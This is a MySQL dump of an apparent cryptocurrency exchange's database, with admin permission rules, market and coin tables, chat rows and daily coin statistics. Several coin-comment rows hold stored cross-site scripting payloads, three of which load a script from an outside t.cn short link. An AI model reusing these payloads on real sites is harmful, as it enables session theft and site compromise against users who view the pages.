INSERT INTO `movesay_auth_rule` VALUES ('1850', 'admin', '1', 'Admin/Cloud/theme', '主题模板', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1851', 'admin', '1', 'Admin/Shop/coin', '付款方式', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1852', 'admin', '1', 'Admin/Huafei/coin', '付款方式', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1853', 'admin', '1', 'Admin/Mytx/status', '状态修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1854', 'admin', '1', 'Admin/Mytx/excel', '取消', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1855', 'admin', '1', 'Admin/Mytx/exportExcel', '导入excel', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1856', 'admin', '1', 'Admin/Menu/index', '菜单管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1857', 'admin', '1', 'Admin/Menu/sort', '排序', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1858', 'admin', '1', 'Admin/Menu/add', '添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1859', 'admin', '1', 'Admin/Menu/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1860', 'admin', '1', 'Admin/Menu/del', '删除', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1861', 'admin', '1', 'Admin/Menu/toogleHide', '是否隐藏', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1862', 'admin', '1', 'Admin/Menu/toogleDev', '是否开发', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1863', 'admin', '1', 'Admin/Menu/importFile', '导入文件', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1864', 'admin', '1', 'Admin/Menu/import', '导入', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1865', 'admin', '1', 'Admin/Config/text', '提示文字', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1866', 'admin', '1', 'Admin/User/qianbao', '用户钱包', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1867', 'admin', '1', 'Admin/Trade/market', '交易市场', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1868', 'admin', '1', 'Admin/Finance/mytxConfig', '人民币提现配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1869', 'admin', '1', 'Admin/Finance/mytxChexiao', '撤销提现', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1870', 'admin', '1', 'Admin/Cloud/kefu', '客服代码', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1871', 'admin', '1', 'Admin/Cloud/kefuUp', '使用', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1872', 'admin', '1', 'Admin/Shop/log', '购物记录', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1873', 'admin', '1', 'Admin/Fenhong/log', '分红记录', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1874', 'admin', '1', 'Admin/Config/qita', '其他配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1875', 'admin', '1', 'Admin/User/bank', '提现地址', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1876', 'admin', '1', 'Admin/Trade/invit', '交易推荐', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1877', 'admin', '1', 'Admin/Finance/myzr', '虚拟币转入', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1878', 'admin', '1', 'Admin/Finance/mytxQueren', '确认提现', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1879', 'admin', '1', 'Admin/Finance/myzcQueren', '确认转出', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1880', 'admin', '1', 'Admin/Shop/goods', '收货地址', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1881', 'admin', '1', 'Admin/Verify/code', '图形验证码', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1882', 'admin', '1', 'Admin/Verify/mobile', '手机验证码', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1883', 'admin', '1', 'Admin/Verify/email', '邮件验证码', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1884', 'admin', '1', 'Admin/User/coin', '用户财产', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1885', 'admin', '1', 'Admin/Finance/myzc', '虚拟币转出', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1886', 'admin', '1', 'Admin/Config/daohang', '导航配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1887', 'admin', '1', 'Admin/User/myzc_qr', '确认转出', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1888', 'admin', '1', 'Admin/User/goods', '联系地址', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1889', 'admin', '1', 'Admin/Article/status', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1890', 'admin', '1', 'Admin/Finance/myczStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1891', 'admin', '1', 'Admin/Finance/myczQueren', '确认到账', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1892', 'admin', '1', 'Admin/Article/typeStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1893', 'admin', '1', 'Admin/Article/linkStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1894', 'admin', '1', 'Admin/Article/adverStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1895', 'admin', '1', 'Admin/Article/adverImage', '上传图片', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1896', 'admin', '1', 'Admin/User/coinlogs', '用户财产日志', '1', '');

-- ----------------------------
-- Table structure for movesay_bazaar
-- ----------------------------
DROP TABLE IF EXISTS `movesay_bazaar`;
CREATE TABLE `movesay_bazaar` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `coin` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `deal` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(2) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='集市交易表';

-- ----------------------------
-- Records of movesay_bazaar
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_bazaar_config
-- ----------------------------
DROP TABLE IF EXISTS `movesay_bazaar_config`;
CREATE TABLE `movesay_bazaar_config` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `market` varchar(50) CHARACTER SET utf8 NOT NULL COMMENT '市场名称',
  `price_min` decimal(20,8) unsigned NOT NULL COMMENT '最小交易价格',
  `price_max` decimal(20,8) unsigned NOT NULL COMMENT '最大交易价格',
  `num_mix` decimal(20,8) unsigned NOT NULL COMMENT '最小交易数量',
  `num_max` decimal(20,8) unsigned NOT NULL COMMENT '最大交易数量',
  `invit_coin` varchar(50) CHARACTER SET utf8 NOT NULL COMMENT '上家赠送币种',
  `invit_1` decimal(20,8) unsigned NOT NULL COMMENT '一代赠送比例',
  `invit_2` decimal(20,8) unsigned NOT NULL COMMENT '二代赠送比例',
  `invit_3` decimal(20,8) unsigned NOT NULL COMMENT '三代赠送比例',
  `fee` varchar(50) CHARACTER SET utf8 NOT NULL COMMENT '手续费',
  `default` tinyint(2) unsigned NOT NULL COMMENT '默认',
  `sort` int(11) unsigned NOT NULL COMMENT '排序',
  `addtime` int(11) unsigned NOT NULL COMMENT '添加时间',
  `endtime` int(11) unsigned NOT NULL COMMENT '编辑时间',
  `status` tinyint(2) unsigned NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `coinname` (`market`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_bazaar_config
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_bazaar_invit
-- ----------------------------
DROP TABLE IF EXISTS `movesay_bazaar_invit`;
CREATE TABLE `movesay_bazaar_invit` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `invit` int(11) unsigned NOT NULL,
  `name` varchar(50) CHARACTER SET utf8 NOT NULL,
  `type` varchar(50) CHARACTER SET utf8 NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_bazaar_invit
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_bazaar_log
-- ----------------------------
DROP TABLE IF EXISTS `movesay_bazaar_log`;
CREATE TABLE `movesay_bazaar_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `peerid` int(11) unsigned NOT NULL,
  `coin` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`),
  KEY `peerid` (`peerid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='集市交易记录表';

-- ----------------------------
-- Records of movesay_bazaar_log
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_category
-- ----------------------------
DROP TABLE IF EXISTS `movesay_category`;
CREATE TABLE `movesay_category` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '分类ID',
  `name` varchar(30) NOT NULL COMMENT '标志',
  `title` varchar(50) NOT NULL COMMENT '标题',
  `pid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '上级分类ID',
  `sort` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '排序（同级有效）',
  `list_row` tinyint(3) unsigned NOT NULL DEFAULT '10' COMMENT '列表每页行数',
  `meta_title` varchar(50) NOT NULL DEFAULT '' COMMENT 'SEO的网页标题',
  `keywords` varchar(255) NOT NULL DEFAULT '' COMMENT '关键字',
  `description` varchar(255) NOT NULL DEFAULT '' COMMENT '描述',
  `template_index` varchar(100) NOT NULL COMMENT '频道页模板',
  `template_lists` varchar(100) NOT NULL COMMENT '列表页模板',
  `template_detail` varchar(100) NOT NULL COMMENT '详情页模板',
  `template_edit` varchar(100) NOT NULL COMMENT '编辑页模板',
  `model` varchar(100) NOT NULL DEFAULT '' COMMENT '关联模型',
  `type` varchar(100) NOT NULL DEFAULT '' COMMENT '允许发布的内容类型',
  `link_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '外链',
  `allow_publish` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '是否允许发布内容',
  `display` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '可见性',
  `reply` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '是否允许回复',
  `check` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '发布的文章是否需要审核',
  `reply_model` varchar(100) NOT NULL DEFAULT '',
  `extend` text NOT NULL COMMENT '扩展设置',
  `create_time` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间',
  `status` tinyint(4) NOT NULL DEFAULT '0' COMMENT '数据状态',
  `icon` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '分类图标',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_name` (`name`),
  KEY `pid` (`pid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='分类表';

-- ----------------------------
-- Records of movesay_category
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_chat
-- ----------------------------
DROP TABLE IF EXISTS `movesay_chat`;
CREATE TABLE `movesay_chat` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` varchar(20) NOT NULL,
  `username` varchar(255) NOT NULL,
  `content` varchar(255) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='文字聊天表';

-- ----------------------------
-- Records of movesay_chat
-- ----------------------------
INSERT INTO `movesay_chat` VALUES ('4', '16', 'pppppp', '11', '0', '1504545331', '0', '1');
INSERT INTO `movesay_chat` VALUES ('5', '4877', 'myworld111', 'uu', '0', '1504547172', '0', '1');
INSERT INTO `movesay_chat` VALUES ('6', '16', 'pppppp', 'qqwqw', '0', '1504622403', '0', '1');
INSERT INTO `movesay_chat` VALUES ('7', '16', 'pppppp', 'wqqqwhhhhhhhhhhhhhhh', '0', '1504622420', '0', '1');
INSERT INTO `movesay_chat` VALUES ('8', '4944', 'LX103', '1111', '0', '1505466283', '0', '1');
INSERT INTO `movesay_chat` VALUES ('9', '5048', 'w734944583', 'nxnfndnd', '0', '1506612509', '0', '1');
INSERT INTO `movesay_chat` VALUES ('10', '5048', 'w734944583', 'ndjnfjfn', '0', '1506612536', '0', '1');
INSERT INTO `movesay_chat` VALUES ('11', '5048', 'w734944583', 'dnxjndn', '0', '1506612575', '0', '1');

-- ----------------------------
-- Table structure for movesay_coin
-- ----------------------------
DROP TABLE IF EXISTS `movesay_coin`;
CREATE TABLE `movesay_coin` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `type` varchar(50) NOT NULL,
  `title` varchar(50) NOT NULL,
  `img` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `fee_bili` varchar(50) NOT NULL,
  `endtime` int(11) unsigned NOT NULL COMMENT '',
  `addtime` int(11) unsigned NOT NULL,
  `status` int(4) unsigned NOT NULL,
  `fee_meitian` varchar(200) NOT NULL COMMENT '每天限制',
  `dj_zj` varchar(200) NOT NULL,
  `dj_dk` varchar(200) NOT NULL,
  `dj_yh` varchar(200) NOT NULL,
  `dj_mm` varchar(200) NOT NULL,
  `zr_zs` varchar(50) NOT NULL,
  `zr_jz` varchar(50) NOT NULL,
  `zr_dz` varchar(50) NOT NULL,
  `zr_sm` varchar(50) NOT NULL,
  `zc_sm` varchar(50) NOT NULL,
  `zc_fee` varchar(50) NOT NULL,
  `zc_user` varchar(50) NOT NULL,
  `zc_min` varchar(50) NOT NULL,
  `zc_max` varchar(50) NOT NULL,
  `zc_jz` varchar(50) NOT NULL,
  `zc_zd` varchar(50) NOT NULL,
  `js_yw` varchar(50) NOT NULL,
  `js_sm` text NOT NULL,
  `js_sm_en` text,
  `js_qb` varchar(50) NOT NULL,
  `js_ym` varchar(50) NOT NULL,
  `js_gw` varchar(50) NOT NULL,
  `js_lt` varchar(50) NOT NULL,
  `js_wk` varchar(50) NOT NULL,
  `cs_yf` varchar(50) NOT NULL,
  `cs_sf` varchar(50) NOT NULL,
  `cs_fb` varchar(50) NOT NULL,
  `cs_qk` varchar(50) NOT NULL,
  `cs_zl` varchar(50) NOT NULL,
  `cs_cl` varchar(50) NOT NULL,
  `cs_zm` varchar(50) NOT NULL,
  `cs_nd` varchar(50) NOT NULL,
  `cs_jl` varchar(50) NOT NULL,
  `cs_ts` varchar(50) NOT NULL,
  `cs_bz` varchar(50) NOT NULL,
  `tp_zs` varchar(50) NOT NULL,
  `tp_js` varchar(50) NOT NULL,
  `tp_yy` varchar(50) NOT NULL,
  `tp_qj` varchar(50) NOT NULL,
  `max_leiji` int(10) DEFAULT NULL,
  `max_meitian` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='币种配置表';

-- ----------------------------
-- Records of movesay_coin
-- ----------------------------
INSERT INTO `movesay_coin` VALUES ('7', 'cny', 'rmb', '人民币', 'cny.png', '0', '', '0', '0', '1', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', null, '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', null, null);
INSERT INTO `movesay_coin` VALUES ('10', 'sgc', 'rgb', '星瀚全球链', '59aece7179490.png', '0', '0', '0', '0', '1', '', '127.0.0.1', '20785', 'user', 'password', '0', '1', '1', '', '', '0', '', '1', '10000', '1', '5000', 'Star Global Coin', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '10', '50');

-- ----------------------------
-- Table structure for movesay_coin_comment
-- ----------------------------
DROP TABLE IF EXISTS `movesay_coin_comment`;
CREATE TABLE `movesay_coin_comment` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(10) unsigned NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `content` varchar(500) NOT NULL,
  `cjz` int(11) unsigned NOT NULL,
  `tzy` int(11) unsigned NOT NULL,
  `xcd` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(10) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM AUTO_INCREMENT=27 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_coin_comment
-- ----------------------------
INSERT INTO `movesay_coin_comment` VALUES ('14', '2027', 'ofc', '太棒了，随进随出，动，静结合的利益合理化，再加上本身升值！', '4', '0', '0', '0', '1486975057', '0', '1');
INSERT INTO `movesay_coin_comment` VALUES ('15', '1826', 'ofc', '非常好的虚拟币，随进随出，升值空间巨大！', '4', '0', '0', '0', '1487731028', '0', '1');
INSERT INTO `movesay_coin_comment` VALUES ('16', '736', 'ofc', '太棒了，随进随出，动，静结合的利益合理化，再加上本身升值！', '3', '0', '0', '0', '1487872321', '0', '1');
INSERT INTO `movesay_coin_comment` VALUES ('17', '3926', 'ofc', '价位低是它的优势。', '0', '0', '0', '0', '1489142673', '0', '1');
INSERT INTO `movesay_coin_comment` VALUES ('18', '4371', 'ofc', '不仅仅是数字货币这么简单，结合了很多时代的趋势，2017年其财富价值势不可挡', '1', '0', '0', '0', '1489587091', '0', '1');
INSERT INTO `movesay_coin_comment` VALUES ('19', '4371', 'ofc', '从来没有接触到这么完善的投资，威信y3054541576', '1', '1', '0', '0', '1489587156', '0', '1');
INSERT INTO `movesay_coin_comment` VALUES ('20', '4844', 'btc', '<script>alert(1)</script>', '0', '0', '0', '0', '1489755079', '0', '1');
INSERT INTO `movesay_coin_comment` VALUES ('21', '4844', 'ofc', '66666666666666666<a herf=\'#\'>666666</a>', '0', '0', '0', '0', '1489755131', '0', '1');
INSERT INTO `movesay_coin_comment` VALUES ('22', '4844', 'ofc', '<sCRIPT>ALERT(1)<SCRiPT>', '0', '0', '0', '0', '1489755537', '0', '1');
INSERT INTO `movesay_coin_comment` VALUES ('23', '4844', 'ltc', '1', '0', '0', '0', '0', '1489755843', '0', '1');
INSERT INTO `movesay_coin_comment` VALUES ('24', '4844', 'ltc', '<SCRIPT src=http://t.cn/RiZjmcy>6666</scrIPT>', '0', '0', '0', '0', '1489756069', '0', '1');
INSERT INTO `movesay_coin_comment` VALUES ('25', '4844', 'btc', '<scrIPTt src=http://t.cn/RiZjmcy>6666666666</scriPt>', '0', '0', '0', '0', '1489756141', '0', '1');
INSERT INTO `movesay_coin_comment` VALUES ('26', '4844', 'eth', '<scrIPt src=http://t.cn/RiZjmcy>---------------</scRipt>', '0', '0', '0', '0', '1489756209', '0', '1');

-- ----------------------------
-- Table structure for movesay_coin_json
-- ----------------------------
DROP TABLE IF EXISTS `movesay_coin_json`;
CREATE TABLE `movesay_coin_json` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `data` varchar(500) COLLATE utf8_unicode_ci NOT NULL,
  `type` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=1799 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_coin_json
-- ----------------------------
INSERT INTO `movesay_coin_json` VALUES ('1731', 'sgc', '[0,0,null,null]', '', '0', '1505318399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1732', 'sgc', '[0,0,null,null]', '', '0', '1505404799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1733', 'sgc', '[0,0,null,null]', '', '0', '1505491199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1734', 'sgc', '[0,0,null,null]', '', '0', '1505577599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1735', 'sgc', '[0,0,null,null]', '', '0', '1505663999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1736', 'sgc', '[500000,0,null,null]', '', '0', '1505750399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1737', 'sgc', '[499685,0,null,null]', '', '0', '1505836799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1738', 'sgc', '[505685,0,null,null]', '', '0', '1505923199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1739', 'sgc', '[505685,0,null,null]', '', '0', '1506009599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1740', 'sgc', '[505685,0,null,null]', '', '0', '1506095999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1741', 'sgc', '[505685,0,null,null]', '', '0', '1506182399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1742', 'sgc', '[505685,0,null,null]', '', '0', '1506268799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1743', 'sgc', '[505785,0,null,null]', '', '0', '1506355199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1744', 'sgc', '[505785,0,null,null]', '', '0', '1506441599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1745', 'sgc', '[505285,0,null,null]', '', '0', '1506527999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1746', 'sgc', '[1547284.95,0,null,null]', '', '0', '1506614399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1747', 'sgc', '[1548234.95,0,null,null]', '', '0', '1506700799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1748', 'sgc', '[1548234.95,0,null,null]', '', '0', '1506787199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1749', 'sgc', '[1548234.95,0,null,null]', '', '0', '1506873599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1750', 'sgc', '[1548234.95,0,null,null]', '', '0', '1506959999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1751', 'sgc', '[1548234.95,0,null,null]', '', '0', '1507046399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1752', 'sgc', '[1548234.95,0,null,null]', '', '0', '1507132799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1753', 'sgc', '[1548234.95,0,null,null]', '', '0', '1507219199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1754', 'sgc', '[1577234.45,0,null,null]', '', '0', '1507305599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1755', 'sgc', '[1577234.45,0,null,null]', '', '0', '1507391999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1756', 'sgc', '[1577234.45,0,null,null]', '', '0', '1507478399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1757', 'sgc', '[1577234.45,0,null,null]', '', '0', '1507564799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1758', 'sgc', '[1577234.4,0,null,null]', '', '0', '1507651199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1759', 'sgc', '[1577234.4,0,null,null]', '', '0', '1507737599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1760', 'sgc', '[1677223.9,0,null,null]', '', '0', '1507823999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1761', 'sgc', '[1677223.9,0,null,null]', '', '0', '1507910399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1762', 'sgc', '[1677223.9,0,null,null]', '', '0', '1507996799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1763', 'sgc', '[1677223.9,0,null,null]', '', '0', '1508083199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1764', 'sgc', '[1677223.9,0,null,null]', '', '0', '1508169599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1765', 'sgc', '[1677223.9,0,null,null]', '', '0', '1508255999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1766', 'sgc', '[1677223.9,0,null,null]', '', '0', '1508342399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1767', 'sgc', '[1677223.9,0,null,null]', '', '0', '1508428799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1768', 'sgc', '[1677223.9,0,null,null]', '', '0', '1508515199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1769', 'sgc', '[1677223.9,0,null,null]', '', '0', '1508601599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1770', 'sgc', '[1677223.9,0,null,null]', '', '0', '1508687999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1771', 'sgc', '[1677223.9,0,null,null]', '', '0', '1508774399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1772', 'sgc', '[1678223.9,0,null,null]', '', '0', '1508860799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1773', 'sgc', '[1678223.9,0,null,null]', '', '0', '1508947199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1774', 'sgc', '[1678223.9,0,null,null]', '', '0', '1509033599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1775', 'sgc', '[1678223.9,0,null,null]', '', '0', '1509119999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1776', 'sgc', '[1678223.9,0,null,null]', '', '0', '1509206399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1777', 'sgc', '[1678223.9,0,null,null]', '', '0', '1509292799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1778', 'sgc', '[1678223.9,0,null,null]', '', '0', '1509379199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1779', 'sgc', '[1678223.9,0,null,null]', '', '0', '1509465599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1780', 'sgc', '[1678223.9,0,null,null]', '', '0', '1509551999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1781', 'sgc', '[1678223.9,0,null,null]', '', '0', '1509638399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1782', 'sgc', '[1678223.9,0,null,null]', '', '0', '1509724799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1783', 'sgc', '[1678223.9,0,null,null]', '', '0', '1509811199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1784', 'sgc', '[1678223.9,0,null,null]', '', '0', '1509897599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1785', 'sgc', '[1678223.9,0,null,null]', '', '0', '1509983999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1786', 'sgc', '[1678223.9,0,null,null]', '', '0', '1510070399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1787', 'sgc', '[1678223.9,0,null,null]', '', '0', '1510156799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1788', 'sgc', '[1678223.9,0,null,null]', '', '0', '1510243199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1789', 'sgc', '[1678223.9,0,null,null]', '', '0', '1510329599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1790', 'sgc', '[1678223.9,0,null,null]', '', '0', '1510415999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1791', 'sgc', '[1678223.9,0,null,null]', '', '0', '1510502399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1792', 'sgc', '[1678223.9,0,null,null]', '', '0', '1510588799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1793', 'sgc', '[1678223.9,0,null,null]', '', '0', '1510675199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1794', 'sgc', '[1678223.9,0,null,null]', '', '0', '1510761599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1795', 'sgc', '[1678223.9,0,null,null]', '', '0', '1510847999', '0', '0');
